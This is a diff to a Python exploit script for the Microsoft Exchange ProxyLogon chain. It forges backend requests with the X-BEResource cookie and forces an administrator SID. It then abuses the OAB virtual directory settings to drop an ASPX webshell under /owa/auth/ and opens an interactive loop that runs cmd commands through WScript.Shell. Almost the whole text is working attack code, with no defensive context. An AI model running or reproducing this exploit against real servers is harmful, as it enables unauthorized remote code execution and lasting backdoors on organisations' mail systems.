@@ -12,13 +12,13 @@ def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
 if len(sys.argv) < 2:
-	print("Usage: python3 %s <target> <email>"%sys.argv[0])
-	print("Example: python3 %s mail.evil.corp root@evil.corp"%sys.argv[0])
-	exit()
+  print("Usage: python3 %s <target> <email>"%sys.argv[0])
+  print("Example: python3 %s mail.evil.corp root@evil.corp"%sys.argv[0])
+  exit()
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 target = sys.argv[1]
 email = sys.argv[2]
-shell_name = "evilcorp.aspx"
+shell_name = "shell.aspx"
 random_name = id_generator(3) + ".js"
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
 
@@ -80,7 +80,8 @@ if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.text:
     exit()
 
 sid = ct.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
-
+if sid.rsplit("-",1)[1] != '500':
+   sid = sid.rsplit("-",1)[0] + '-500'
 print("Got SID: " + sid)
 
 proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
@@ -89,7 +90,9 @@ proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-
 ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
     "Content-Type": "text/xml",
-    "msExchLogonMailbox": "S-1-5-20",
+    "msExchLogonAccount": "%s" %sid,
+    "msExchLogonMailbox": "%s" %sid,
+    "msExchTargetMailbox": "%s" % sid,
     "User-Agent": user_agent
 },
                    data=proxyLogon_request,
@@ -108,7 +111,9 @@ print("Got canary: " + msExchEcpCanary)
 ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, sess_id, msExchEcpCanary),
-    "msExchLogonMailbox": "S-1-5-20",
+    "msExchLogonAccount": "%s" %sid,
+    "msExchLogonMailbox": "%s" %sid,
+    "msExchTargetMailbox": "%s" % sid,
     "User-Agent": user_agent
 },
                   verify=False
@@ -123,7 +128,9 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
     "Content-Type": "application/json; charset=utf-8",
-    "msExchLogonMailbox": "S-1-5-20",
+    "msExchLogonAccount": "%s" %sid,
+    "msExchLogonMailbox": "%s" %sid,
+    "msExchTargetMailbox": "%s" % sid,
     "User-Agent": user_agent
 
 },
@@ -147,7 +154,9 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
     "Content-Type": "application/json; charset=utf-8",
-    "msExchLogonMailbox": "S-1-5-20",
+    "msExchLogonAccount": "%s" %sid,
+    "msExchLogonMailbox": "%s" %sid,
+    "msExchTargetMailbox": "%s" % sid,
     "User-Agent": user_agent
 },
                    json=oab_json,
@@ -166,7 +175,9 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
     "Content-Type": "application/json; charset=utf-8",
-    "msExchLogonMailbox": "S-1-5-20",
+    "msExchLogonAccount": "%s" %sid,
+    "msExchLogonMailbox": "%s" %sid,
+    "msExchTargetMailbox": "%s" % sid,
     "User-Agent": user_agent
 },
                    json=reset_oab_body,
@@ -179,9 +190,12 @@ if ct.status_code != 200:
 print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
 print('(+) Code: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
 time.sleep(2)
-while True:
-	cmd = input('CMD: ')
-	shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())'''%cmd
-	shell_req = requests.post('https://%s/owa/auth/%s'%(target, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user_agent},data=shell_body_exec,verify=False)
-	print(shell_req.text.split('Name                            :')[0])
-
+req_test = requests.get('https://%s/owa/auth/%s'%(target, shell_name), verify=False)
+if "OAB (Default Web Site)" in req_test.text:
+  while True:
+    cmd = input('CMD: ')
+    shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())'''%cmd
+    shell_req = requests.post('https://%s/owa/auth/%s'%(target, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user_agent},data=shell_body_exec,verify=False)
+    print(shell_req.text.split('Name                            :')[0])
+else:
+  print('(!) Webshell not found due to Covid, try again!')
